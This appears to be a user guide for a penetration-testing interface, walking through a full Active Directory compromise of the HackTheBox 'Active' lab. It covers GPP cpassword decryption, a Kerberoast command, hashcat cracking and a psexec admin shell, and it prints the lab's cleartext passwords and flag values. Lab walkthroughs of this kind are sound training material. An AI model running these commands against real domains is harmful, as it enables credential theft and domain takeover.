# B.R.E.A.C.H. Attack Workflow Guide

**B.R.E.A.C.H.** = Box Reconnaissance, Exploitation & Attack Command Hub

This guide walks through a complete Active Directory attack using B.R.E.A.C.H., based on the HTB "Active" box scenario.

---

## Quick Start

```bash
# Launch B.R.E.A.C.H.
crack-breach

# Launch with debug logging
crack-breach --debug
```

---

## UI Layout Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│ B.R.E.A.C.H.  │ [Engagement Name]               │ Neo4j: Connected  │
├────────────┬─────────────────────────────────┬──────────────────────┤
│            │                                 │                      │
│  TARGET    │         WORKSPACE               │    CONTEXT           │
│  SIDEBAR   │      (Terminals)                │    PANEL             │
│            │                                 │                      │
│  - Targets │                                 │  - Credentials       │
│  - Services│                                 │  - Loot              │
│            │                                 │  - Quick Actions     │
│            │                                 │                      │
└────────────┴─────────────────────────────────┴──────────────────────┘
```

---

## Phase 1: Setup & Initial Recon

### UI State
```
┌─────────────────────────────────────────────────────────────────────┐
│ B.R.E.A.C.H.  │ [Q4 Pentest]                    │ Neo4j: Connected  │
├────────────┬─────────────────────────────────┬──────────────────────┤
│ TARGETS    │         TERMINALS               │  CREDENTIALS (0)    │
│            │                                 │  No credentials     │
│ 10.10.10.100│  [bash] [+]                    │                     │
│   └ scanning│                                │  LOOT (0)           │
│            │  $ nmap -sC -sV 10.10.10.100   │  No loot            │
│            │                                 │                     │
└────────────┴─────────────────────────────────┴──────────────────────┘
```

### Steps
1. **Launch B.R.E.A.C.H.** - Opens with engagement loaded from Neo4j
2. **Add Target** - Target sidebar shows `10.10.10.100`
3. **Create Terminal** - Click `[+]` to spawn bash session
4. **Run nmap** - Initial enumeration discovers services

### What Happens
- Target appears in sidebar with status indicator
- Services populate as nmap discovers them (53, 88, 389, 445)
- DC indicator appears when Kerberos + LDAP detected

---

## Phase 2: SMB Enumeration & Loot Capture

### UI State
```
┌─────────────────────────────────────────────────────────────────────┐
│ TARGETS    │         TERMINALS               │  CREDENTIALS (0)    │
│            │                                 │                     │
│ 10.10.10.100│  $ smbclient -N -L //10.10.10.100│                   │
│  ├ 53/tcp  │  Sharename    Type             │  LOOT (1)           │
│  ├ 88/tcp  │  Replication  Disk             │  ┌──────────────┐   │
│  ├ 389/tcp │  SYSVOL       Disk             │  │ Groups.xml   │   │
│  └ 445/tcp │  NETLOGON     Disk             │  │ [gpp_password]│   │
│    [DC]    │                                 │  └──────────────┘   │
└────────────┴─────────────────────────────────┴──────────────────────┘
```

### Steps
5. **Enumerate SMB shares** - Find `Replication` share is accessible
6. **Browse SYSVOL** - Navigate to `Policies/{GUID}/Machine/Preferences/Groups/`
7. **Download Groups.xml** - File is automatically captured as **Loot**
8. **Pattern Detection** - UI shows `[gpp_password]` badge on the file

### What Happens
- Downloaded file added to Loot panel automatically
- PRISM GPP parser detects `cpassword` pattern
- Badge appears indicating extractable credential

---

## Phase 3: Extract GPP Credential

### Loot Preview Modal
```
┌─────────────────────────────────────────────────────────────────────┐
│                        LOOT PREVIEW                                 │
│  ─────────────────────────────────────────────────────────────────  │
│  Groups.xml                                              [Decrypt]  │
│  ─────────────────────────────────────────────────────────────────  │
│  <?xml version="1.0" encoding="utf-8"?>                            │
│  <Groups>                                                           │
│    <User clsid="{...}" name="active.htb\SVC_TGS">                  │
│      <Properties userName="active.htb\SVC_TGS"                     │
│                  cpassword="edBSHOwhZLTjt/QS9FeIcJ8=..." />        │
│    </User>                                                          │
│  </Groups>                                                          │
│                        [Extract Credential]                         │
└─────────────────────────────────────────────────────────────────────┘
```

### Steps
9. **Click Loot item** → Opens preview modal
10. **Click `[gpp_password]` badge** → Triggers GPP decrypt action
11. **Credential extracted** → Appears in Credential Vault automatically

### Credential Vault After Extraction
```
┌──────────────────────────────────────────────────────────────────┐
│  CREDENTIALS (1)                                                  │
│  ──────────────────────────────────────────────────────────────  │
│  ▼ ACTIVE.HTB (1)                                                │
│    ┌─────────────────────────────────────────────────────────┐   │
│    │ 🔑 ACTIVE\SVC_TGS                      [GPP] [Copy] [...] │   │
│    │    via Groups.xml                                        │   │
│    └─────────────────────────────────────────────────────────┘   │
└──────────────────────────────────────────────────────────────────┘
```

### What Happens
- GPP cpassword decrypted using Microsoft's published AES key
- Cleartext password stored in Neo4j
- Credential appears grouped by domain

---

## Phase 4: Use Credential for Kerberoast

### Action Menu
```
┌──────────────────────┐
│ Use Credential       │
│ ──────────────────── │
│ 🖥 SMBMap            │
│ 🖥 SMBClient         │
│ 🖥 CrackMapExec      │
│ 🖥 Kerberoast   ←────│── Click this
│ 🖥 Secrets Dump      │
│ ──────────────────── │
│ Secret: GPP*****     │
└──────────────────────┘
```

### Steps
12. **Click credential `[...]` menu** → Shows available actions
13. **Select "Kerberoast"** → Spawns new terminal with command:
    ```bash
    GetUserSPNs.py "ACTIVE.HTB/SVC_TGS:GPPstillStandingStrong2k18" -dc-ip 10.10.10.100 -request
    ```
14. **Hash captured** → Output parsed by PRISM Kerberoast parser

### Credential Vault After Kerberoast
```
┌──────────────────────────────────────────────────────────────────┐
│  CREDENTIALS (2)                                                  │
│  ──────────────────────────────────────────────────────────────  │
│  ▼ ACTIVE.HTB (2)                                                │
│    ┌─────────────────────────────────────────────────────────┐   │
│    │ 🔑 ACTIVE\SVC_TGS                      [GPP] [Copy] [...] │   │
│    │    via Groups.xml                                        │   │
│    ├─────────────────────────────────────────────────────────┤   │
│    │ 🎫 ACTIVE\Administrator           [Kerberos] [Copy] [...] │   │
│    │    via GetUserSPNs.py (TGS hash - needs cracking)        │   │
│    └─────────────────────────────────────────────────────────┘   │
└──────────────────────────────────────────────────────────────────┘
```

### What Happens
- Command auto-populated with credential values
- New terminal spawned with Kerberoast command
- TGS hash detected and stored as Kerberos credential type
- Hash marked as "needs cracking"

---

## Phase 5: Crack Hash (Offline)

### Steps
15. **Copy Kerberos hash** → Click `[Copy]` on Administrator credential
16. **Run hashcat** (separate terminal):
    ```bash
    hashcat -m 13100 admin.hash /usr/share/wordlists/rockyou.txt
    ```
17. **Update credential** → Mark as cracked, change type to `password`

### What Happens
- Hash copied to clipboard in hashcat-compatible format
- After cracking, credential can be updated with plaintext
- Type changes from `kerberos` to `password`
- More action options become available

---

## Phase 6: Get Admin Shell

### Action Menu for Cracked Credential
```
┌──────────────────────┐
│ Use Credential       │
│ ──────────────────── │
│ 🖥 WMIExec      ←────│── Admin shell options
│ 🖥 PSExec            │
│ 🖥 Evil-WinRM        │
│ 🖥 Secrets Dump      │
└──────────────────────┘
```

### Steps
18. **Click Administrator credential `[...]` menu**
19. **Select "PSExec"** → Spawns shell:
    ```bash
    psexec.py "ACTIVE.HTB/Administrator:Ticketmaster1968@10.10.10.100"
    ```

### What Happens
- Shell spawned with admin credentials
- Session tracked in Neo4j
- Ready for post-exploitation

---

## Phase 7: Capture Flags

### Loot Panel with Flags
```
┌──────────────────────────────────────────────────────────────────┐
│  LOOT (3)                                          🚩 2 flags    │
│  ──────────────────────────────────────────────────────────────  │
│  [All] [Flags] [Hashes]                                          │
│  ──────────────────────────────────────────────────────────────  │
│  🚩 user.txt                                                     │
│     C:\Users\SVC_TGS\Desktop\user.txt                           │
│     86d67d8ba232bb6a254aa4d10159e983                            │
│  ──────────────────────────────────────────────────────────────  │
│  🚩 root.txt                                                     │
│     C:\Users\Administrator\Desktop\root.txt                      │
│     b5fc76d1d6b91d77b2fbf2d54d0f708b                            │
│  ──────────────────────────────────────────────────────────────  │
│  📄 Groups.xml                              [gpp_password]       │
└──────────────────────────────────────────────────────────────────┘
```

### Steps
20. **Download flags** → Automatically detected as flag type
21. **View in Loot panel** → Flags tab shows captured proof

### What Happens
- Files named `user.txt`, `root.txt`, etc. auto-tagged as flags
- Flag content extracted and displayed
- Engagement progress tracked

---

## Data Flow Architecture

```
Terminal Output          PRISM Parser           Neo4j Storage         UI Component
─────────────────────────────────────────────────────────────────────────────────────
Groups.xml download  →   GPP Parser      →   (:Loot)           →   LootPanel
                              ↓
                         Decrypt cpassword →  (:Credential)     →   CredentialVault
                              
GetUserSPNs.py output →  Kerberoast Parser → (:Credential)     →   CredentialVault

secretsdump.py output →  Secretsdump Parser → (:Credential)    →   CredentialVault

user.txt / root.txt  →   Flag Detection   →  (:Loot type=flag) →   LootPanel [Flags]
```

---

## Key UI Interactions Reference

| Action | Location | Result |
|--------|----------|--------|
| Click credential | CredentialVault | Opens action menu |
| Click action (e.g., WMIExec) | Action menu | Spawns terminal with substituted command |
| Click loot pattern badge | LootPanel | Triggers extraction/decryption |
| Click `[Copy]` | Credential card | Copies `user:password` or hash to clipboard |
| Expand domain group | CredentialVault | Shows all creds for that domain |
| Switch to Flags tab | LootPanel | Filters to only flag files |
| Click target | TargetSidebar | Shows services, enables target-specific actions |
| Click `[+]` button | Terminal tabs | Creates new bash session |

---

## Credential Types & Icons

| Type | Icon | Description | Actions Available |
|------|------|-------------|-------------------|
| `password` | 🔑 | Cleartext password | All (SMB, WinRM, Kerberoast, etc.) |
| `gpp` | 🛡️ | GPP decrypted password | All (treated as cleartext) |
| `ntlm` | # | NTLM hash | Pass-the-hash (WMIExec, PSExec) |
| `kerberos` | 🎫 | TGS/AS-REP hash | Copy for cracking |
| `sam` | # | SAM database hash | Pass-the-hash |
| `dcc2` | # | Cached credentials | Copy for cracking |
| `ssh_key` | 🔒 | SSH private key | SSH connection |

---

## Loot Pattern Detection

| Pattern | Badge | Auto-Action |
|---------|-------|-------------|
| `cpassword="..."` | `[gpp_password]` | Decrypt GPP |
| `$krb5tgs$...` | `[kerberos_hash]` | Extract to Credentials |
| `LM:NT` format | `[ntlm_hash]` | Extract to Credentials |
| `-----BEGIN...KEY-----` | `[ssh_key]` | Extract to Credentials |
| Flag format (32 hex, HTB{}, etc.) | `[flag]` | Mark as flag |

---

## Neo4j Graph Model

```cypher
(:Engagement {name, status})
    -[:TARGETS]->(:Target {ip, hostname, os})
        -[:HAS_SERVICE]->(:Service {port, protocol, name})
        
(:Engagement)-[:HAS_CREDENTIAL]->(:Credential {username, secret, type, domain})
    -[:FOUND_ON]->(:Target)
    -[:EXTRACTED_BY]->(:TerminalSession)
    
(:Engagement)-[:HAS_LOOT]->(:Loot {name, path, type, patterns[]})
    -[:FROM_TARGET]->(:Target)
    -[:DISCOVERED_BY]->(:TerminalSession)
```

---

## Keyboard Shortcuts

| Key | Action |
|-----|--------|
| `Ctrl+T` | New terminal |
| `Ctrl+W` | Close terminal |
| `Ctrl+Tab` | Next terminal |
| `Ctrl+Shift+Tab` | Previous terminal |
| `Ctrl+C` | Send SIGINT to terminal |
| `Ctrl+D` | Send EOF to terminal |

---

## Troubleshooting

### Neo4j Connection Failed
```bash
# Check Neo4j is running
sudo systemctl status neo4j

# Start Neo4j
sudo systemctl start neo4j

# Check credentials in environment
echo $NEO4J_PASSWORD
```

### PRISM Parser Not Detecting
- Ensure file is downloaded (not just viewed)
- Check file has correct content (not truncated)
- Verify parser is registered: `crack prism --list-parsers`

### Credential Action Not Working
- Verify target IP is set
- Check credential has required fields (domain for domain actions)
- Look for error in terminal output

---

## Related Documentation

- [CLAUDE.md](./CLAUDE.md) - Development guide
- [README.md](./README.md) - Installation and setup
- [../CLAUDE.md](../CLAUDE.md) - CRACK project overview
